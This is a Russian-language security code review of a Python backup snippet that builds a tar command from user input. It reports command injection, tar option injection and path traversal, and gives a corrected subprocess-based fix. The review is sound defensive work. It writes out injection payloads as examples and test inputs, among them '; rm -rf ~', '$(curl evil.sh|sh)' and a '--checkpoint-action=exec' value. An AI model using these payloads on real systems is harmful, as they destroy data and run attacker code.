# Ревью безопасности: `code_review/ex1.txt`

Фрагмент: `cmd = f"tar -czf backup.tgz {folder}"` + `os.system(cmd)`, где `folder` — пользовательский ввод.
Фокус ревью — только безопасность ввода. Итог: **2 blocker, 2 major, 1 minor**.

---

## 1. Командная инъекция через f-string — **blocker**

- **Что не так:** ввод пользователя `folder` склеивается в строку shell-команды без экранирования (CWE-78).
- **Риски:** RCE от имени процесса: `; rm -rf ~`, `$(curl evil.sh|sh)`, `` `id` ``, `&& ...`, `| ...` — всё выполнится.
- **Как исправить:** не собирать строку; передавать аргументы списком: `subprocess.run(["tar", "-czf", out, "--", target], shell=False)`.

**Next steps**
- **До merge:** обязательно. Заменить f-string на список аргументов.
- **Отдельная задача:** да — общий хелпер безопасного запуска команд + аудит остальных вызовов.
- **Тесты:** параметризованные payload'ы `; id`, `$(id)`, `` `id` ``, `| id`, `&& id` → команда не выполняется; легитимный путь с пробелами работает.

---

## 2. `os.system` запускает shell и не даёт кода возврата — **blocker**

- **Что не так:** `os.system` всегда исполняет через `/bin/sh`, а возвращает wait-status, а не код выхода.
- **Риски:** любой метасимвол в `folder` интерпретируется шеллом; успех/провал бэкапа определяется ненадёжно (ошибки «молча»).
- **Как исправить:** `subprocess.run([...], shell=False, capture_output=True, text=True, timeout=...)`, проверять `returncode != 0`, логировать `stderr`.

**Next steps**
- **До merge:** обязательно. Убрать `os.system`.
- **Отдельная задача:** да — правило в линтере/CI, запрещающее `os.system` и `shell=True`.
- **Тесты:** payload'ы из п.1 не исполняются; `returncode` 0 / 1 / 127 обрабатываются предсказуемо.

---

## 3. Инъекция опций `tar` (ведущий `-`) — **major**

- **Что не так:** значение не проверяется на `-` в начале, `--` перед путём не ставится.
- **Риски:** `folder = "--checkpoint-action=exec=sh x.sh"` или `-C /tmp` трактуются как опции `tar` → выполнение команд / обход логики.
- **Как исправить:** добавлять `--` перед путём и отклонять значения, начинающиеся с `-` (валидация по allowlist).

**Next steps**
- **До merge:** обязательно (дешёвый фикс, одна строка + проверка).
- **Отдельная задача:** нет, закрывается в этом PR.
- **Тесты:** `--checkpoint-action=exec=...`, `-C /tmp`, `--to-command=...` → `ValueError`; обычное имя каталога проходит.

---

## 4. Нет валидации пути (path traversal) — **major**

- **Что не так:** принимаются абсолютные пути и `..`; нет ограничения базовым каталогом.
- **Риски:** архивирование произвольных каталогов (`/etc`, `/root`, чужие данные) → утечка данных через бэкап.
- **Как исправить:** `target = (ALLOWED_BASE / folder).resolve()` и проверка, что `ALLOWED_BASE` в `target.parents`; отклонять абсолютные пути и symlink наружу.

**Next steps**
- **До merge:** обязательно. `resolve()` + проверка вхождения в `ALLOWED_BASE`.
- **Отдельная задача:** да — вынести `ALLOWED_BASE` в конфиг и проверить права ФС.
- **Тесты:** `../../etc`, `/etc`, `..`, symlink наружу → отклоняются; вложенный легитимный путь проходит.

---

## 5. Фиксированный выходной файл `backup.tgz` — **minor**

- **Что не так:** имя и место результата жёстко заданы в текущем каталоге.
- **Риски:** перезапись чужого файла, гонки при параллельных запусках, symlink-атака (TOCTOU).
- **Как исправить:** `tempfile.mkstemp(suffix=".tgz")` или уникальное имя в выделенном каталоге бэкапов.

**Next steps**
- **До merge:** желательно (не блокирует merge, если каталог запуска контролируется).
- **Отдельная задача:** да — политика хранения/ротации бэкапов.
- **Тесты:** параллельные запуски не перезаписывают друг друга; подложенный symlink на месте `backup.tgz` не перезаписывается.

---

## Эталонный фикс

```python
import os
import subprocess
import tempfile
from pathlib import Path

ALLOWED_BASE = Path("/srv/data").resolve()


def run_backup(folder: str) -> int:
    if not folder or folder.startswith("-"):
        raise ValueError("invalid folder name")

    target = (ALLOWED_BASE / folder).resolve()
    if target != ALLOWED_BASE and ALLOWED_BASE not in target.parents:
        raise ValueError("path outside allowed base")
    if not target.is_dir():
        raise ValueError("not a directory")

    fd, out = tempfile.mkstemp(suffix=".tgz")
    os.close(fd)

    proc = subprocess.run(
        ["tar", "-czf", out, "--", str(target)],
        shell=False,
        capture_output=True,
        text=True,
        timeout=600,
    )
    if proc.returncode != 0:
        raise RuntimeError(proc.stderr)
    return proc.returncode
```

## Сводка

| # | Проблема | Приоритет | До merge | Отдельная задача |
|---|----------|-----------|----------|------------------|
| 1 | Инъекция через f-string | blocker | да | да |
| 2 | `os.system` / shell | blocker | да | да |
| 3 | Инъекция опций `tar` | major | да | нет |
| 4 | Path traversal | major | да | да |
| 5 | Фиксированный выходной файл | minor | желательно | да |
